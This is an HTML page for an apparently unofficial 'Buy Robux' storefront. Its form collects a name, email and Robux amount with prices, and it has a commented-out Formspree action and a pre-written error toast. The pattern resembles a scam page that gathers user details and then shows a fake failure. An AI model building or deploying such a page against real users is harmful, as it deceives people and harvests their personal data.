<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Order Robux</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="icon" type="image/x-icon" href="slack.svg">
    <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>

<body>
    <div class="container">
        <div class="icon-container">
            <i class="fa-brands fa-slack"></i>
        </div>
        <h1>Buy Robux</h1>
        <form class="form"></form>
        <!-- <form class="form" action="https://formspree.io/f/mqkjklvp" method="post"> -->
            <div class="form-group">
                <label>Name</label>
                <input type="text" id="username" name="UserName" required>
            </div>
            <div class="form-group">
                <label>Email</label>
                <input type="text" id="email" name="Email" required>
            </div>
            <div class="form-group">
                <label>Select <span class="colorChanged">Robux</span> Amount:</label>
                <select id="amount" name="Amount">
                    <option value="0">Select Amount of Robux</option>
                    <option value="20">10</option>
                    <option value="30">25</option>
                    <option value="50">50</option>
                    <option value="75">100</option>
                    <option value="100">150</option>
                    <option value="170">200</option>
                    <option value="220">250</option>
                    <option value="300">350</option>
                    <option value="399">500</option>
                    <option value="500">1,000</option>
                </select>
                <span id="cost" style="display: none;">Cost: $0</span>
                <i id="loadingIcon" class="fa-brands fa-slack fa-spin hidden" style="color: #333;"></i>
            </div>
            <div id="result"></div>
            <div class="form-btn">
                <button id="sendButton" class="btn1" value="Submit">Send</button>
            </div>
        </form>
    </div>

    <div class="toast-container">
        <div class="toast-logo">
            <i class="fa-brands fa-slack" style="font-size: 36px; padding-left: 10px;"></i>
        </div>
  
        <div class="text-content">
          <p class="author-name">We apologize for the inconvenience, but an error has occurred. We are currently experiencing a technical issue with the system. Please try again later.        </p>
        </div>
  
        <div class="close">
            <i class="fa-solid fa-x fa-sm"></i>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
